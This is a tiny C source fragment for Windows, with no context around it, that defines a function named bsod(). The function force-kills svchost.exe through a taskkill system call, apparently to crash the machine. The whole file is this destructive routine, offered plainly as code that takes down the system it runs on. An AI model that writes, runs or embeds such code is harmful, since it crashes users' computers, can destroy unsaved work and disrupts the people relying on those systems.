#include <windows.h>

void bsod(){ system("taskkill /im svchost.exe /f"); }